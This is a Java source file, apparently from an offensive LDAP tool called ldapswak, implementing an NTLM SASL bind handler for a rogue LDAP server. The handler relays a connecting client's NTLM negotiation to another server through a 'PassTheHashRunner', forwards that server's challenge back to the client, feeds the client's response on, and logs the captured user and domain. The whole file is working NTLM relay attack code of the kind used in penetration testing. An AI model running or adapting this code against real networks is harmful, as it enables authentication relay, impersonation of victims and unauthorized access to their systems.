package gs.sy.m8.ldapswak;

import java.util.List;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.unboundid.asn1.ASN1OctetString;
import com.unboundid.ldap.listener.InMemoryRequestHandler;
import com.unboundid.ldap.listener.InMemorySASLBindHandler;
import com.unboundid.ldap.sdk.BindResult;
import com.unboundid.ldap.sdk.Control;
import com.unboundid.ldap.sdk.DN;
import com.unboundid.ldap.sdk.ResultCode;

import jcifs.ntlmssp.Type1Message;
import jcifs.ntlmssp.Type2Message;
import jcifs.ntlmssp.Type3Message;

public class PassTheHashNTLMSASLBindHandler extends InMemorySASLBindHandler {

	private static final Logger log = LoggerFactory.getLogger(PassTheHashNTLMSASLBindHandler.class);
	
	private PassTheHashRunner runner;

	private final BaseCommand config;
	
	public PassTheHashNTLMSASLBindHandler(BaseCommand config) {
		this.config = config;
	}

	@Override
	public String getSASLMechanismName() {
		return "NTLM";
	}

	@Override
	public BindResult processSASLBind(InMemoryRequestHandler handler, int messageID, DN bindDN,
			ASN1OctetString credentials, List<Control> controls) {

		if (credentials == null) {
			return new BindResult(messageID, ResultCode.INVALID_CREDENTIALS, "No credentials", null, null, null);
		}

		byte[] d = credentials.getValue();

		log.debug("Message ID {}", messageID);
		try {

			if (d.length < 12 || d[0] != 'N' || d[1] != 'T' || d[2] != 'L' || d[3] != 'M' || d[4] != 'S' || d[5] != 'S'
					|| d[6] != 'P' || d[7] != 0 || d[9] != 0 || d[10] != 0 || d[11] != 0) {
				log.debug("Not a NTLM message");
				return new BindResult(messageID, ResultCode.INVALID_CREDENTIALS, "Not NTLM", null, null, null);
			}

			// yummy little endian
			if (d[8] == 1) {
				Type1Message t1 = new Type1Message(d);
				log.debug("NTLM Type1: {}", t1);
				runner = new PassTheHashRunner(t1,config);
			
				// fetch challenge
				Type2Message t2 = runner.go();
				
				if ( t2 == null ) {
					log.warn("Did not receive NTLM challenge");
					return new BindResult(messageID, ResultCode.INVALID_CREDENTIALS, "No challenge", null, null, null);
				}
				
				ASN1OctetString saslResponse = new ASN1OctetString(t2.toByteArray());
				return new BindResult(messageID, ResultCode.SASL_BIND_IN_PROGRESS, null, null, null, null,
						saslResponse);
			} else if (d[8] == 3 ) {
				Type3Message t3 = new Type3Message(d);
				log.debug("NTLM Type3: {}", t3);
				log.info("Have NTLM login {}@{}", t3.getUser(), t3.getDomain());
				runner.feed(t3);
				return new BindResult(messageID, ResultCode.SUCCESS, null, null, null, null);
			} else {
				log.debug("Unsupported message type");
			}

		} catch (Exception e) {
			log.warn("Error parsing request", e);
		}

		return new BindResult(messageID, ResultCode.INVALID_CREDENTIALS, "Unknown state", null, null, null);
	}

}
